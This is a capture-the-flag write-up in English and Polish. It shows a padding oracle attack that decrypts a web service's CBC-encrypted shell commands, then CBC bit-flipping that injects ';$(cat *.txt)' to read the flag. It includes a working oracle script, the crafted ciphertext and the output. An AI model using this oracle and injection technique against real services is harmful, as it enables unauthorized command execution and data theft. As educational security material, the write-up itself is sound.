# delphi (web/crypto)

###eng
[pl](#pl-version)

the task was in `web` category, but actually there was almost no `web` there, only `crypto`.
we get a web interface in which we can invoke three commands from a select box.

the commands are `netstat`, `ps aux`, and `echo "this is a longer string that i want to use to test multiple-block patterns`.

we notice that all those commands actually point to the same endpoint `execute`, with different parameters, eg `/execute/5d60992b1d3ac1d561f6cb4149d540ed4f6d549c64b9d39babc58c0f29324312`
so we deduce that the command itself probably is somehow encrypted in the hex-string.
since commands have different lengths we can assume that it is most likely block encryption.
by calculating `gcd` over payload lengths we have we can see that block size can be at most 16 bytes.

if we try to modify the payload we quickly hit `decrypt failure` message.
this seems like a nice setup for oracle padding attack, so we import our oracle padding breaker from crypto-commons are try to run it on the payloads.
if you're interested in how padding oracle works see our other writeup which describes this more in detail: https://github.com/p4-team/ctf/tree/master/2016-09-16-csaw/neo
we need to prepare oracle function, which will tell us if the decryption failed (presumably because of incorrect padding after decrypt):

```python
session = requests.session()

def send(ct):
    while true:
        try:
            url = "http://delphi-status-e606c556.ctf.bsidessf.net/execute/" + ct
            result = session.get(url)
            content = result.content
            return content
        except:
            time.sleep(1)


def oracle(data):
    result = send(data)
    if "decrypt" in result:
        return false
    else:
        return true
```

so we simply send the payload and check if there is `decrypt failed` message in the response.

with this in place we can now run:

```python
from crypto_commons.symmetrical.symmetrical import oracle_padding_recovery

def main():
    ct = '21573ed27b7d10267caebd178a68434c66bb31eabdd648cd38f6a34d53656b00'  # ps aux?
    oracle_padding_recovery(ct, oracle, 16, string.printable)


main()
```

and we manage to recover what we expected -> `ps aux` with pkcs padding.
the same goes for `nestat` command, but the most interesting is the last payload because it has more than a single block we can recover.
the last command ends up to be:

`echo "this is a longer string that i want to use to test multiple-block patterns\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f`

now that we know that we're dealing with cbc encryption, we can use bitflipping to force the payload to decrypt into plaintext of our choosing, at least up to a single block boundary.

the idea behind this attack comes directly from how cbc mode works.
in cbc encryption the plaintext is xored with previous ciphertext block before encryption.
during decryption the block is first decrypted and then xored with previous ciphertext block to recover the real plaintext.
this means, however, that if we modify a single byte of ciphertext of previous block, we will change corresponding byte of the decrypted plaintext in the next block!
keep in mind this will also mess up the decryption of the changed ciphertext block, but this can't be helped.

what we need is to know the ciphertext and corresponding plaintext.
then we know that `pt[i] = decrypt(ct[k][i]) ^ ct[k-1][i]` and we know all those values.
so now if we xor `ct[k-1][i]` with `pt[i]` we should always get 0 as result, since `a xor a = 0`.
and now if we xor this with any value, we will get this value as decryption result!

fortunately we also have this in crypto-commons so we proceed with:

```python
    ct = '2ca638d01882452ec38895c06cd42505e2b5f680cccd0e4ee9c05acf697bc8fa0f33c4e66d69f81e1869606244dbc1f8f2cce8a05447037fb83addb8a9e6da032c1d08a5598422aab67283a1fcf6ca6297970b2a226124505751ed5d425fd8717d2da1ff5cd6a806c85fdb3ad3cbb175'  # echo something
    pt = (
         '?' * 16) + 'echo "this is a longer string that i want to use to test multiple-block patterns\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f'
    ct = set_cbc_payload_for_block(ct.decode("hex"), pt, ';$(cat *.txt)   ', 5).encode("hex")
    print(ct)
```

this way we modify the decryption results for 5th block of the ciphertext.
4th block will be broken, but since it's just passed to `echo` we don't really care about it much.
so we just modified the ciphertext to decode into `echo ... garbage;$(cat *.txt)   ` which invoked in the shell will give us the flag.
and if we now go to the `http://delphi-status-e606c556.ctf.bsidessf.net/execute/2ca638d01882452ec38895c06cd42505e2b5f680cccd0e4ee9c05acf697bc8fa0f33c4e66d69f81e1869606244dbc1f8f2cce8a05447037fb83addb8a9e6da03721442aa579369a0e8678fa1b0a4843197970b2a226124505751ed5d425fd8717d2da1ff5cd6a806c85fdb3ad3cbb175` url with our modified ciphertext we get as expected:

`this is a longer string that i want to use��|��o� |��q)�;flag:a1cf81c5e0872a7e0a4aec2e8e9f74c3   `

###pl version

zadanie co prawda było w kategorii `web` ale w praktyce nie było tam prawie nic z `web` a jedynie z `crypto`.
dostajemy webowy interfejs z którego można wykonać trzy komendy używając select boxa.

komendy to `netstat`, `ps aux` oraz `echo "this is a longer string that i want to use to test multiple-block patterns`.

zauważamy szybko że wszytkie komendy prowadzą do tego samego endpointu `execue` z innym parametrem, np.
`/execute/5d60992b1d3ac1d561f6cb4149d540ed4f6d549c64b9d39babc58c0f29324312`
zgadujemy, że komenda do wykonania jest zaszyfrowana w tym hex-stringu.
skoro komendy mają różne długości to domyślamy się że mamy do czynienia z szyfrem blokowym.
licząc `gcd` z długości znanych payloadów wynika że blok może mieć najwyżej 16 bajtów długości.

jeśli ręcznie zmodyfikujemy payload to szybko dostajemy komunikat `decrypt failure`.
to sugeruje setup dla ataku oracle padding, więc importujemy nasz łamacz z crypto-commons i próbujemy uruchomić go dla posiadanych szyfrogramów.
po szczegóły dotyczące ataku padding oracle odsyłamy do innego writeupa który napisalismy kilka tygodni temu: https://github.com/p4-team/ctf/tree/master/2016-09-16-csaw/neo#pl-version
potrzebujemy do tego przygotować samą wyrocznie, która powie nam czy deszyfrowanie się powiodło czy nie (zakładamy że niepowodzenie wynika z niepopranego paddingu po deszyfrowaniu):

```python
session = requests.session()

def send(ct):
    while true:
        try:
            url = "http://delphi-status-e606c556.ctf.bsidessf.net/execute/" + ct
            result = session.get(url)
            content = result.content
            return content
        except:
            time.sleep(1)


def oracle(data):
    result = send(data)
    if "decrypt" in result:
        return false
    else:
        return true
```

więc po prostu wysyłamy przygotowane dane i sprawdzamy czy w odpowiedzie dostaliśmy wiadomość `decrypt failed`.

możemy teraz uruchomić:

```python
from crypto_commons.symmetrical.symmetrical import oracle_padding_recovery

def main():
    ct = '21573ed27b7d10267caebd178a68434c66bb31eabdd648cd38f6a34d53656b00'  # ps aux?
    oracle_padding_recovery(ct, oracle, 16, string.printable)


main()
```

i udaje nam się odzyskać oczekiwaną komendę -> `ps aux` z paddingiem pkcs.
tak samo jest dla payloadu z `netstat` ale najciekawszy jest ostatni szyfrogram, bo pozwala odzyskać więcej niż 1 blok.
ostatnia komenda to:

`echo "this is a longer string that i want to use to test multiple-block patterns\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f`

skoro wiemy już że mamy do czynienia z szyfrowaniem w trybie cbc, możemy wykorzystać bitflipping żeby zmodyfikować payload tak, aby deszyfrował się do wybranego przez nas plaintextu, przynajmniej do granicy jednego bloku.

idea stojąca za tym atakiem wynika bezpośrednio z działania trybu cbc.
w tym trybie plaintext jest xorowwany z ciphertextem w poprzednim bloku przed szyfrowaniem.
podczas deszyfrowania, po odkodowaniu bloku wynik jest xorowany z ciphertextem poprzedniego bloku w celu odzyskania prawdziwego plaintextu.
to oznacza jednak, że możemy zmodyfikować jeden bajt ciphertextu w poprzednim bloku i tym samym zmienić odpowiadający mu bajt odszyfrowanego plaintextu w kolejnym bloku!
warto pamiętać, że zniszczymy w ten sposób odszyfrowaną wartość bloku gdzie zmieniamy ciphertext, ale tego nie da się ominąć.

potrzebujemy znać ciphertext oraz odpowiadający mu plaintext.
wiemy że `pt[i] = decrypt(ct[k][i]) ^ ct[k-1][i]` i znamy też wszystkie te wartości.
teraz jeśli xorujemy `ct[k-1][i]` z `pt[i]` powinniśmy zawsze po odszyfrowaniu dostać 0 ponieważ `a xor a = 0`.
a teraz jeśli xorujemy to z dowolną inną wartością to uzyskamy tą wartość w wyniku deszyfrowania!

szczęśliwie mamy to już zaimplementowane w crypto-commons więc wykonujemy:

```python
    ct = '2ca638d01882452ec38895c06cd42505e2b5f680cccd0e4ee9c05acf697bc8fa0f33c4e66d69f81e1869606244dbc1f8f2cce8a05447037fb83addb8a9e6da032c1d08a5598422aab67283a1fcf6ca6297970b2a226124505751ed5d425fd8717d2da1ff5cd6a806c85fdb3ad3cbb175'  # echo something
    pt = (
         '?' * 16) + 'echo "this is a longer string that i want to use to test multiple-block patterns\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f'
    ct = set_cbc_payload_for_block(ct.decode("hex"), pt, ';$(cat *.txt)   ', 5).encode("hex")
    print(ct)
```

w ten sposób zmieniamy wynik deszyfrowania 5 bloku.
4 blok będzie popsuty, ale jest to input dla `echo` więc nie przejmuejmy się tym specjalnie.
teraz nasz zmieniony ciphertext powinien zdeszyfrować się do czegoś w postaci `echo ... garbage;$(cat *.txt)   ` co wykonane w shellu da nam flagę.
i faktycznie wchodząc pod url `http://delphi-status-e606c556.ctf.bsidessf.net/execute/2ca638d01882452ec38895c06cd42505e2b5f680cccd0e4ee9c05acf697bc8fa0f33c4e66d69f81e1869606244dbc1f8f2cce8a05447037fb83addb8a9e6da03721442aa579369a0e8678fa1b0a4843197970b2a226124505751ed5d425fd8717d2da1ff5cd6a806c85fdb3ad3cbb175` url ze zmienionym ciphertextem dostajemy:

`this is a longer string that i want to use��|��o� |��q)�;flag:a1cf81c5e0872a7e0a4aec2e8e9f74c3   `
